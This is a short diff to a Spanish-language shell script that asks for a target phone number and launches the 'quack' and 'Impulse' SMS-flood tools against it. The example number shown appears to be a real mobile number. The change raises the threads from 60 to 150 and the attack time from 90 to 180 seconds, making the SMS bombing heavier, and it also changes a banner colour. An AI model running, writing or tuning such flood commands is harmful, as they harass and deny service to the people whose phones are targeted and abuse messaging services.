@@ -28,7 +28,7 @@ echo -e -n "${verde}
 █ ${blanco}INGRESE EL NÚMERO OBJETIVO ${verde}█
 └════════════════════════════┘
 ┃    ┌══════════════════════════┐
-└═>>>█ EJEMPLO => ${blanco}+593981480757 ${verde}█
+└═>>>█ EJEMPLO => ${blanco}+593981480757 ${amarillo}█
 ┃    └══════════════════════════┘
 ┃
 └═>>> "${blanco}
@@ -41,7 +41,7 @@ SETSMS
 PHONE
 cd
 cd quack
-python quack --tool SMS --target ${phone} --threads 60 --timeout 90
+python quack --tool SMS --target ${phone} --threads 150 --timeout 180
 cd
 cd Impulse
-python impulse.py --method SMS --time 90 --threads 60 --target ${phone}
+python impulse.py --method SMS --time 180 --threads 150 --target ${phone}
